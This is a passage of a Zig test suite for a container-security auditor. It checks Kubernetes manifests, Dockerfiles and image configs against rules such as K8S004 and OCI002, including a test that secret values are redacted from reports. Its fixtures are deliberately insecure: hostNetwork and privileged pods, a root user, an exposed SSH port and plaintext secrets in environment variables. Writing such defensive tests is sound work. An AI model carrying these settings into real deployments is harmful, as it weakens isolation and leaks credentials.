        \\  hostNetwork: true
        \\---
        \\apiVersion: v1
        \\kind: Pod
        \\metadata: {name: p}
        \\spec:
        \\  <<: *bad
        \\  containers:
        \\  - name: c
        \\    image: a:1
        \\    securityContext: {}
        \\    resources: {limits: {cpu: "1"}}
    ;
    var r = try auditKubernetes(testing.allocator, manifest, "merged.yaml");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "K8S004")); // hostNetwork from merge
    try testing.expect(hasRule(r.items, "K8S006")); // privileged from merge
}

test "Kubernetes: multi-doc separates rules per document" {
    const manifest =
        \\apiVersion: v1
        \\kind: Pod
        \\metadata: {name: a}
        \\spec:
        \\  hostNetwork: true
        \\  containers:
        \\  - {name: c, image: a:1, securityContext: {}, resources: {limits: {}}}
        \\---
        \\apiVersion: v1
        \\kind: ConfigMap
        \\metadata: {name: cm}
        \\data: {k: v}
    ;
    var r = try auditKubernetes(testing.allocator, manifest, "multi.yaml");
    defer r.deinit(testing.allocator);
    // hostNetwork from first doc only; ConfigMap is not a workload.
    try testing.expectEqual(@as(usize, 1), countByRule(r.items, "K8S004"));
    try testing.expect(!hasRule(r.items, "K8S002")); // ConfigMap shouldn't trigger missing securityContext
}

test "detectAndAudit picks Dockerfile by basename" {
    const df = "FROM alpine:3.19\nUSER 1000\nHEALTHCHECK CMD true\n";
    var r = try detectAndAudit(testing.allocator, df, "/repo/Dockerfile");
    defer r.deinit(testing.allocator);
    try testing.expectEqual(@as(usize, 0), r.items.len);
}

test "detectAndAudit picks Kubernetes by extension" {
    const manifest = "apiVersion: v1\nkind: ConfigMap\nmetadata: {name: x}\n";
    var r = try detectAndAudit(testing.allocator, manifest, "cm.yaml");
    defer r.deinit(testing.allocator);
    // ConfigMap is not a workload; should be clean.
    try testing.expectEqual(@as(usize, 0), r.items.len);
}

test "detectAndAudit content sniffs Dockerfile" {
    const df = "FROM alpine:3.19\nUSER 1000\nHEALTHCHECK CMD true\n";
    var r = try detectAndAudit(testing.allocator, df, "/repo/unnamed");
    defer r.deinit(testing.allocator);
    try testing.expectEqual(@as(usize, 0), r.items.len);
}

test "auditImageConfig: USER root + secret env + no healthcheck + ssh port" {
    const cfg =
        \\{
        \\  "architecture": "amd64",
        \\  "os": "linux",
        \\  "config": {
        \\    "User": "root",
        \\    "Env": ["PATH=/usr/bin", "DB_PASSWORD=hunter2"],
        \\    "ExposedPorts": {"22/tcp": {}, "80/tcp": {}},
        \\    "Cmd": ["bash"]
        \\  }
        \\}
    ;
    var r = try auditImageConfig(testing.allocator, cfg, "image:tag");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "OCI001"));
    try testing.expect(hasRule(r.items, "OCI002"));
    try testing.expect(hasRule(r.items, "OCI003"));
    try testing.expect(hasRule(r.items, "OCI004"));
}

test "auditImageConfig: clean config" {
    const cfg =
        \\{
        \\  "config": {
        \\    "User": "1000:1000",
        \\    "Env": ["PATH=/usr/bin"],
        \\    "ExposedPorts": {"8080/tcp": {}},
        \\    "Healthcheck": {"Test": ["CMD", "/healthz"]}
        \\  }
        \\}
    ;
    var r = try auditImageConfig(testing.allocator, cfg, "image:tag");
    defer r.deinit(testing.allocator);
    try testing.expectEqual(@as(usize, 0), r.items.len);
}

test "auditImageConfig: env redaction strips value from snippet" {
    const cfg =
        \\{
        \\  "config": {
        \\    "User": "1000",
        \\    "Env": ["AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"],
        \\    "Healthcheck": {"Test": ["CMD", "true"]}
        \\  }
        \\}
    ;
    var r = try auditImageConfig(testing.allocator, cfg, "image");
    defer r.deinit(testing.allocator);
    try testing.expect(hasRule(r.items, "OCI002"));
    for (r.items) |it| {
        if (std.mem.eql(u8, it.rule_id, "OCI002")) {
            try testing.expect(std.mem.indexOf(u8, it.snippet, "wJalr") == null);
            try testing.expect(std.mem.indexOf(u8, it.snippet, "EXAMPLEKEY") == null);
        }
    }
}
